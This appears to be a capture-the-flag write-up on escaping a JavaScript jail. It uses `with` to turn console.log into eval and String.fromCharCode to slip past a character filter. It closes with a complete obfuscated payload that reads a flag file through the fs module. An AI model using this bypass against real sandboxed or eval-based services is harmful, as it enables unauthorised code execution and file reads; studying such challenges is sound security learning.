# js without getattr

there are a few required noticings here

first, we can still define variables if we dont use `let`, `var`, or `const`.

second, the `with` statement exists (see [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with))

third, process.mainModule.require is the global require function even though it is not listed on process.mainModule as an attribute

with `with`, we have arb attribute read and write pretty much

we can overwrite console.log with eval, and then return a string which is eval'd. 

notably, we dont need to use semicolons after a with statement so the following is valid i think

```
with(console){log=eval}'malicious code here'
```

next, we need to make arb strings to win

we can avoid the tree filter, but the char filter is still there

to win, we can use String.fromCharCode in another with statement and set a variable with a one letter name to it

lastly, we can use `throw` and `fs` module to get the flag in a very short payload

the payload is below

```
with(console){log=eval}'with(String){z=fromCharCode}eval(z(116)+z(104)+z(114)+z(111)+z(119)+z(32)+z(112)+z(114)+z(111)+z(99)+z(101)+z(115)+z(115)+z(46)+z(109)+z(97)+z(105)+z(110)+z(77)+z(111)+z(100)+z(117)+z(108)+z(101)+z(46)+z(114)+z(101)+z(113)+z(117)+z(105)+z(114)+z(101)+z(40)+z(39)+z(102)+z(115)+z(39)+z(41)+z(46)+z(114)+z(101)+z(97)+z(100)+z(70)+z(105)+z(108)+z(101)+z(83)+z(121)+z(110)+z(99)+z(40)+z(39)+z(102)+z(108)+z(97)+z(103)+z(46)+z(116)+z(120)+z(116)+z(39)+z(41))'
```

you can also compress with substitution like `g=z(101)` within the brackets of `if(1){}`
